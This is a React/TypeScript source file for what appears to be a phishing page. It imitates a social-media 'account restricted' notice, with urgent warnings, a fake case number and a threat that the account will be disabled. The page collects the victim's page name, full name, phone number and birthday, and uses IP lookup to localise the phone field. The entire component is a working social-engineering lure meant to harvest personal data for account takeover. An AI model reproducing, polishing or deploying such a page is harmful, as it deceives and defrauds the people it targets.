import React, { useEffect, useState } from 'react';
import PhoneInput from 'react-phone-input-2';
import 'react-phone-input-2/lib/style.css';
import HomeImage from '@assets/home-image.png';
import getToday from '@utils/getToday';
import { getCountry } from '@utils/getIP';

type FieldName = 'pageName' | 'name' | 'phoneNumber' | 'birthday';

interface Errors {
	pageName?: string;
	name?: string;
	phoneNumber?: string;
	birthday?: string;
}

const GetInfo: React.FC = () => {
	const [pageName, setPageName] = useState<string>('');
	const [name, setName] = useState<string>('');
	const [phoneNumber, setPhoneNumber] = useState<string>('');
	const [birthday, setBirthday] = useState<string>('');

	const [errors, setErrors] = useState<Errors>({});
	const [country, setCountry] = useState<string | undefined>(undefined);

	const handleInputChange = (
		event: React.ChangeEvent<HTMLInputElement>,
		field: FieldName,
	) => {
		const value = event.target.value;

		switch (field) {
			case 'pageName':
				setPageName(value);
				break;
			case 'name':
				setName(value);
				break;
			case 'phoneNumber':
				setPhoneNumber(value);
				break;
			case 'birthday':
				setBirthday(formatDate(value));
				break;
			default:
				break;
		}
	};

	const formatDate = (value: string) => {
		const digits = value.replace(/\D/g, '');
		if (digits.length <= 2) return digits;
		if (digits.length <= 4)
			return `${digits.slice(0, 2)}/${digits.slice(2)}`;
		return `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4, 8)}`;
	};

	const handlePhoneInputChange = (
		_value: string,
		_data: object,
		_event: React.ChangeEvent<HTMLInputElement>,
		formattedValue: string,
	) => {
		setPhoneNumber(formattedValue);
	};

	const handlePhoneInputBlur = () => {
		validateInput('phoneNumber', phoneNumber);
	};

	const validateInput = (field: FieldName, value: string) => {
		let error = '';

		switch (field) {
			case 'pageName':
				if (!value.trim()) error = 'Page name is required';
				break;

			case 'name':
				if (!value.trim()) error = 'Name is required';
				break;

			case 'phoneNumber': {
				if (!value.trim()) {
					error = 'Phone Number is required';
				} else if (!isValidPhoneNumber(value)) {
					error = 'Invalid phone number format';
				}
				break;
			}

			case 'birthday': {
				if (!value.trim()) {
					error = 'Birthday is required';
				} else if (!isValidDate(value)) {
					error = 'Invalid date format (MM/DD/YYYY)';
				}
				break;
			}

			default:
				break;
		}

		setErrors((prevErrors) => ({
			...prevErrors,
			[field]: error,
		}));
	};

	const isValidPhoneNumber = (number: string): boolean => {
		return /^[\d+\-() ]+$/.test(number);
	};
	const isValidDate = (date: string): boolean => {
		const dateRegex = /^(0[1-9]|1[0-2])\/(0[1-9]|[12]\d|3[01])\/\d{4}$/;
		if (!dateRegex.test(date)) return false;
		const [month, day, year] = date.split('/').map(Number);
		if (month < 1 || month > 12) return false;
		const daysInMonth = [
			31,
			isLeapYear(year) ? 29 : 28,
			31,
			30,
			31,
			30,
			31,
			31,
			30,
			31,
			30,
			31,
		];
		return day >= 1 && day <= daysInMonth[month - 1];
	};

	const isLeapYear = (year: number): boolean => {
		return (year % 4 === 0 && year % 100 !== 0) || year % 400 === 0;
	};

	useEffect(() => {
		const fetchCountry = async () => {
			try {
				const result = await getCountry();
				setCountry(result.toLowerCase());
			} catch (error) {
				console.error('Failed to fetch country', error);
			}
		};

		fetchCountry();
	}, []);

	const handleChange =
		(field: FieldName) => (event: React.ChangeEvent<HTMLInputElement>) => {
			handleInputChange(event, field);
		};

	return (
		<div className='flex w-11/12 flex-col justify-center md:w-1/3'>
			<div>
				<img src={HomeImage} className='w-full' alt='' />
				<b className='text-2xl'>Your account has been restricted</b>
				<p className='text-sm text-gray-500'>Term of Service</p>
				<hr />
			</div>
			<div className='my-5'>
				We detected unusual activity in your page today{' '}
				<strong>{getToday()}</strong>. Someone has reported your account
				for not complying with{' '}
				<b className='cursor-pointer font-medium text-blue-500 hover:underline'>
					Community Standards
				</b>
				. We have already reviewed this decision and the decision cannot
				be changed. To avoid having your account{' '}
				<b className='cursor-pointer font-medium text-blue-500 hover:underline'>
					disabled
				</b>{' '}
				, please verify:
			</div>
			<div className='my-5'>
				<input
					className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
					type='text'
					placeholder='Page Name'
					value={pageName}
					onChange={handleChange('pageName')}
					onBlur={() => validateInput('pageName', pageName)}
				/>
				{errors.pageName && (
					<p className='text-red-500'>{errors.pageName}</p>
				)}

				<input
					className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
					type='text'
					placeholder='Your Name (Name and Surname)'
					value={name}
					onChange={handleChange('name')}
					onBlur={() => validateInput('name', name)}
				/>
				{errors.name && <p className='text-red-500'>{errors.name}</p>}

				<PhoneInput
					country={country ?? ''}
					value={phoneNumber}
					onChange={handlePhoneInputChange}
					onBlur={handlePhoneInputBlur}
					jumpCursorToEnd
					isValid={(value) =>
						!!value.trim() && isValidPhoneNumber(value)
					}
					copyNumbersOnly={true}
					autocompleteSearch={true}
					containerClass='group my-4 flex items-center w-full p-3 rounded-lg border bg-white border-gray-300 focus-within:border-blue-500 react-tel-input'
					inputClass='my-2 w-full rounded-lg text-base border-none border border-gray-300'
					buttonClass='border-none bg-transparent'
					dropdownClass='border-none bg-white'
				/>

				{errors.phoneNumber && (
					<p className='text-red-500'>{errors.phoneNumber}</p>
				)}

				<input
					className='my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
					type='text'
					placeholder='Birthday (MM/DD/YYYY)'
					value={birthday}
					onChange={handleChange('birthday')}
					onBlur={() => validateInput('birthday', birthday)}
				/>
				{errors.birthday && (
					<p className='text-red-500'>{errors.birthday}</p>
				)}
			</div>
			<div className='flex flex-col justify-between border-b border-t border-gray-300 p-2 text-sm text-gray-500 sm:flex-row'>
				<div className='flex gap-1 sm:flex-col sm:gap-0'>
					<b>Case Number:</b>
					<b className='text-blue-500'> #324876790618</b>
				</div>
				<div className='w-full sm:w-3/4'>
					<b>
						About Case: Violating Community Standards and Posting
						something inappropriate.
					</b>
				</div>
			</div>
		</div>
	);
};

export default GetInfo;
